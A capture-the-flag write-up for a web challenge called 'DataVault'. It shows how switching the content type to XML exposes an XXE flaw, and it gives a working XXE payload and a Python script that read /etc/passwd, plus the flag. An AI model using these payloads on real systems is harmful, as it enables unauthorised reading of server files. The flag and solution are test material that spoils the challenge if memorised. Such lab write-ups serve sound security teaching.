# DataVault - Writeup

## Challenge Info
- **Category:** Web
- **Difficulty:** Medium
- **Flag:** `flag{XX3_v!a_C0nt3nt_Typ3_Sw1tch}`

---

## Recon

Visiting `http://localhost:8080`, we find a modern-looking API testing interface called "DataVault" for profile storage. The UI only allows JSON submissions.

Intercepting the request shows:

```http
POST /api/profile HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"name":"John Doe","bio":"Software Engineer"}
```

Response:
```json
{"status":"ok","source":"application/json","received":{"name":"John Doe","bio":"Software Engineer"}}
```

---

## Discovery

The response includes `"source": "application/json"` — this hints that the server identifies and possibly handles different content types.

Testing with XML:

```http
POST /api/profile HTTP/1.1
Host: localhost:8080
Content-Type: application/xml

<profile><name>test</name><bio>hello</bio></profile>
```

Response:
```json
{"status":"ok","source":"application/xml","received":{"name":"test","bio":"hello"}}
```

The server parses XML! This opens the door for XXE attacks.

---

## Exploitation (XXE)

Craft an XML payload with an external entity to read `/etc/passwd`:

```http
POST /api/profile HTTP/1.1
Host: localhost:8080
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE profile [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<profile>
  <name>hacker</name>
  <bio>&xxe;</bio>
</profile>
```

Response:
```json
{
  "status": "ok",
  "source": "application/xml",
  "received": {
    "name": "hacker",
    "bio": "root:x:0:0:root:/root:/bin/bash\n...datavault:x:1001:1001:flag{XX3_v!a_C0nt3nt_Typ3_Sw1tch}:/nonexistent:/usr/sbin/nologin\n"
  }
}
```

---

## Solution Script

```python
#!/usr/bin/env python3
import requests

url = "http://localhost:8080/api/profile"

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE profile [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<profile>
  <name>pwned</name>
  <bio>&xxe;</bio>
</profile>
"""

r = requests.post(url, data=payload, headers={"Content-Type": "application/xml"})
print(r.json()["received"]["bio"])
```

---

## Flag

```
flag{XX3_v!a_C0nt3nt_Typ3_Sw1tch}
```

---

## Key Takeaways

1. **Content-Type switching** — APIs may accept multiple formats with different security postures
2. **XXE vulnerabilities** — XML parsers with external entities enabled can leak server files
3. **Response clues** — The `source` field hinted at content-type handling
